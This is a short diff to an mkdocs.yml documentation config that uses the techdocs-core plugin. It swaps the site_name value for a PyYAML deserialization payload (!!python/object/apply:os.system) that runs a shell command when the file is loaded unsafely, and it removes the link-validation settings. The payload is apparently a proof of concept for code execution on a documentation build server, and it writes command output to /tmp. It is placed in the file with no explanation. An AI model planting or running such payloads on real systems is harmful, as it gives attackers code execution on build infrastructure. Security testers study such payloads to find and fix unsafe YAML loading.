@@ -1,10 +1,7 @@
-site_name: macros
+site_name: !!python/object/apply:os.system ["id > /tmp/rce_pyyaml_success"]
 plugins:
   - techdocs-core
-validation:
-  links:
-    absolute_links: info 
-    unrecognized_links: info
+
 
 
 
